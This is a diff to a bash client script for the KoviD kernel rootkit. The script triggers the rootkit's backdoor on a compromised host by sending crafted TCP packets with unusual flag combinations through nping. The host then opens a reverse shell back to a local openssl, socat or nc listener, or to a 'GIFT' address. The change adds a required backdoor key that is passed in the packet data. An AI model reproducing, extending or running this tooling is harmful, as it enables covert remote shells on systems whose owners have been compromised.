@@ -62,16 +62,16 @@ usage="Use: [V=1] ./${0##*/} <method> <IP> <PORT>
         Local port for connect-back session - must be unfiltered
 
     Example:
-        ./${0##*/} openssl 192.168.1.10 9999
+        ./${0##*/} openssl 192.168.1.10 9999 <Backdoor KEY>
 
     Verbose, example:
-        V=1 ./${0##*/} openssl 192.168.1.10 9999
+        V=1 ./${0##*/} openssl 192.168.1.10 9999 <Backdoor KEY>
 
     Connect to GIFT address instead of this machine:
-        GIFT=192.168.0.30 ./${0##*/} openssl 192.168.1.10 443
+        GIFT=192.168.0.30 ./${0##*/} openssl 192.168.1.10 443 <Backdoor KEY>
 
     If used alongside with GIFT, DRY(run) will NOT send KoviD instruction and will show client's command:
-        DRY=true GIFT=192.168.0.30 ./${0##*/} openssl 192.168.1.44 444"
+        DRY=true GIFT=192.168.0.30 ./${0##*/} openssl 192.168.1.44 444 <Backdoor KEY>"
 
 
 errexit() {
@@ -91,7 +91,7 @@ check_util() {
     done
 } >&2
 
-if [[ "$#" -ne 3 ]]; then
+if [[ "$#" -ne 4 ]]; then
     errexit "Missing parameter" true 1
 fi
 
@@ -130,7 +130,7 @@ case $1 in
             [[ ! -n "$V" ]] && exec &>/dev/null
             # shellcheck disable=SC2086
             "$NPING" "$1" $GIFT --tcp -p "$RR_OPENSSL" --flags Ack,rSt,pSh \
-                --source-port "$2" -c 1
+                --source-port "$2" --data="$3" -c 1
         }
         [[ "$DRY" == false ]] && f "$@" &
         pushd "$PERMDIR" >/dev/null && {
@@ -147,7 +147,7 @@ case $1 in
             [[ ! -n "$V" ]] && exec &>/dev/null
             # shellcheck disable=SC2086
             "$NPING" "$1" $GIFT --tcp -p "$RR_SOCAT" --flags Fin,Urg,aCK \
-                --source-port "$2" -c 1
+                --source-port "$2" --data="$3" -c 1
         }
         [[ "$DRY" == false ]] && f "$@" &
         pushd "$PERMDIR" >/dev/null && {
@@ -163,7 +163,7 @@ case $1 in
             [[ ! -n "$V" ]] && exec &>/dev/null
             # shellcheck disable=SC2086
              "$NPING" "$1" $GIFT --tcp -p "$RR_NC" --flags Ack,rSt,pSh \
-                 --source-port "$2" -c 1
+                 --source-port "$2" --data="$3" -c 1
         }
         [[ "$DRY" == false ]] && f "$@" &
         listen "$NC" -lvp "$2"
@@ -177,7 +177,7 @@ case $1 in
             [[ ! -n "$V" ]] && exec &>/dev/null
             # shellcheck disable=SC2086
             "$NPING" "$1" $GIFT --tcp -p "$RR_SOCAT_TTY" --flags Cwr,Urg,fiN,rsT \
-                --source-port "$2" -c 1
+                --source-port "$2" --data="$3" -c 1
         }
         [[ "$DRY" == false ]] && f "$@" &
         pushd "$PERMDIR" >/dev/null && {
